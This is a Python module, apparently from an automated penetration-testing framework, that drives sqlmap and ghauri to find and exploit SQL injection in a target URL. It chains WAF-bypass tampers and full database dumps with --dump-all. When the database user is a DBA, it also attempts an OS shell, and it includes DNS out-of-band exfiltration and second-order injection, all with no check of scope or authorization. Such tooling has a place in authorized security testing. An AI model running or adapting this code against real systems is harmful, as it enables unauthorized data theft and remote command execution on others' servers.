from __future__ import annotations

import subprocess
from pathlib import Path
from typing import Any, Optional

from core.models import Vulnerability, WafResult
from tools.waf.waf_bypass_strategy import WafBypassStrategy

# Tools that are pip-installed and must run inside their venv
_VENV_TOOLS = {"sqlmap", "ghauri"}


def _resolve_cmd(tool_name: str, args: list[str]) -> list[str]:
    """
    Build a subprocess command for *tool_name* using its isolated venv if available,
    otherwise fall back to the system binary.

    sqlmap and ghauri are pip-based — they must always run inside their venv
    to avoid system-level dependency conflicts (PEP 668 / Kali externally-managed).
    """
    if tool_name in _VENV_TOOLS:
        try:
            from installer.tool_venv_manager import get_global_venv_manager
            manager = get_global_venv_manager()
            venv_python: Optional[Path] = manager.get_venv_python(tool_name)
            if venv_python and venv_python.exists():
                return [str(venv_python), "-m", tool_name] + args
        except Exception:
            pass
    return [tool_name] + args


class SQLiMethodology:
    """Orchestrates SQL injection testing: detection, exploitation, enumeration,
    privilege escalation, OOB, and second-order. All sqlmap/ghauri calls run
    inside their isolated venvs."""

    def __init__(self) -> None:
        self._bypass = WafBypassStrategy()

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    def detect(self, url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            findings.extend(self._run_sqlmap_detect(url, param))
        except Exception:
            pass
        try:
            findings.extend(self._run_ghauri_detect(url, param))
        except Exception:
            pass
        return findings

    def _run_sqlmap_detect(self, url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = [
                "-u", url, "-p", param,
                "--level=1", "--risk=1", "--batch",
                "--technique=BEUSTQ",
                "--output-dir=/tmp/sqlmap_detect",
            ]
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if "is vulnerable" in output or "sqlmap identified" in output or "Parameter:" in output:
                findings.append(
                    Vulnerability(
                        name="SQL Injection",
                        severity="critical",
                        confidence=0.9,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Use parameterized queries / prepared statements.",
                    )
                )
        except Exception:
            pass
        return findings

    def _run_ghauri_detect(self, url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = ["-u", url, "-p", param, "--batch", "--level=1"]
            cmd = _resolve_cmd("ghauri", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if "is vulnerable" in output or "injectable" in output.lower() or "Parameter" in output:
                findings.append(
                    Vulnerability(
                        name="SQL Injection",
                        severity="critical",
                        confidence=0.85,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["ghauri"],
                        exploit_available=True,
                        remediation="Use parameterized queries / prepared statements.",
                    )
                )
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Exploitation
    # ------------------------------------------------------------------

    def exploit(self, url: str, param: str, technique: str, waf: WafResult | None) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            tampers = self._bypass.get_sqlmap_tampers(waf.vendor if waf else None)
            tamper_str = ",".join(tampers) if tampers else ""
            args = [
                "-u", url, "-p", param, "--batch",
                f"--technique={technique}",
                "--output-dir=/tmp/sqlmap_exploit",
            ]
            if tamper_str:
                args += ["--tamper", tamper_str]
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if "is vulnerable" in output or "sqlmap identified" in output:
                findings.append(
                    Vulnerability(
                        name="SQL Injection",
                        severity="critical",
                        confidence=0.95,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Use parameterized queries / prepared statements.",
                    )
                )
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Database Enumeration
    # ------------------------------------------------------------------

    def enumerate_db(self, url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        for extra, vuln_name in [
            (["--dbs"], "Database Enumeration via SQLi"),
            (["--tables"], "Table Enumeration via SQLi"),
            (["--dump-all", "--exclude-sysdbs"], "Data Dump via SQLi"),
        ]:
            try:
                findings.extend(self._sqlmap_enum_step(url, param, extra, vuln_name))
            except Exception:
                pass
        return findings

    def _sqlmap_enum_step(self, url: str, param: str, extra_flags: list[str], vuln_name: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = ["-u", url, "-p", param, "--batch", "--output-dir=/tmp/sqlmap_enum"] + extra_flags
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if output.strip():
                findings.append(
                    Vulnerability(
                        name=vuln_name,
                        severity="critical",
                        confidence=0.9,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Use parameterized queries / prepared statements.",
                    )
                )
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Privilege Escalation
    # ------------------------------------------------------------------

    def escalate_privileges(self, url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = ["-u", url, "-p", param, "--batch", "--is-dba", "--output-dir=/tmp/sqlmap_privesc"]
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if "current user is DBA" in output:
                findings.append(
                    Vulnerability(
                        name="SQL Injection - DBA Privileges",
                        severity="critical",
                        confidence=0.95,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89", "CWE-250"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Restrict database user privileges; never run app DB user as DBA.",
                    )
                )
                try:
                    os_args = ["-u", url, "-p", param, "--batch", "--os-shell", "--output-dir=/tmp/sqlmap_osshell"]
                    os_cmd = _resolve_cmd("sqlmap", os_args)
                    os_result = subprocess.run(os_cmd, capture_output=True, text=True, timeout=120, shell=False)
                    os_output = os_result.stdout + os_result.stderr
                    if "os-shell" in os_output.lower() or "command standard output" in os_output.lower():
                        findings.append(
                            Vulnerability(
                                name="SQL Injection - OS Shell via DBA",
                                severity="critical",
                                confidence=0.95,
                                target=url,
                                url=url,
                                cwe_ids=["CWE-89", "CWE-78"],
                                evidence=os_output[:2000],
                                tool_sources=["sqlmap"],
                                exploit_available=True,
                                remediation="Restrict database user privileges; never run app DB user as DBA.",
                            )
                        )
                except Exception:
                    pass
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Out-of-Band Exfiltration
    # ------------------------------------------------------------------

    def out_of_band(self, url: str, param: str, dns_domain: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = ["-u", url, "-p", param, "--batch", f"--dns-domain={dns_domain}", "--output-dir=/tmp/sqlmap_oob"]
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if dns_domain in output or "DNS" in output:
                findings.append(
                    Vulnerability(
                        name="SQL Injection - Out-of-Band DNS Exfiltration",
                        severity="critical",
                        confidence=0.9,
                        target=url,
                        url=url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Use parameterized queries; block outbound DNS from DB server.",
                    )
                )
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Second-Order Injection
    # ------------------------------------------------------------------

    def second_order(self, inject_url: str, trigger_url: str, param: str) -> list[Vulnerability]:
        findings: list[Vulnerability] = []
        try:
            args = [
                "-u", inject_url, "-p", param, "--batch",
                f"--second-url={trigger_url}",
                "--output-dir=/tmp/sqlmap_secondorder",
            ]
            cmd = _resolve_cmd("sqlmap", args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, shell=False)
            output = result.stdout + result.stderr
            if "is vulnerable" in output or "sqlmap identified" in output:
                findings.append(
                    Vulnerability(
                        name="Second-Order SQL Injection",
                        severity="critical",
                        confidence=0.9,
                        target=inject_url,
                        url=inject_url,
                        cwe_ids=["CWE-89"],
                        evidence=output[:2000],
                        tool_sources=["sqlmap"],
                        exploit_available=True,
                        remediation="Use parameterized queries at both storage and retrieval points.",
                    )
                )
        except Exception:
            pass
        return findings

    # ------------------------------------------------------------------
    # Orchestrator
    # ------------------------------------------------------------------

    def run(self, target: str, params: list[str], context: Any = None) -> list[Vulnerability]:
        waf: WafResult | None = None
        if context is not None and hasattr(context, "waf_result"):
            waf = context.waf_result

        all_findings: list[Vulnerability] = []
        for param in params:
            all_findings.extend(self.detect(target, param))
            all_findings.extend(self.exploit(target, param, "BEUSTQ", waf))
            all_findings.extend(self.enumerate_db(target, param))
        return self._deduplicate(all_findings)

    # ------------------------------------------------------------------
    # Deduplication
    # ------------------------------------------------------------------

    def _deduplicate(self, findings: list[Vulnerability]) -> list[Vulnerability]:
        seen: dict[tuple[str, str, str], Vulnerability] = {}
        for vuln in findings:
            key = (vuln.name, vuln.url, vuln.severity)
            if key in seen:
                existing = seen[key]
                for src in vuln.tool_sources:
                    if src not in existing.tool_sources:
                        existing.tool_sources.append(src)
            else:
                seen[key] = vuln
        return list(seen.values())
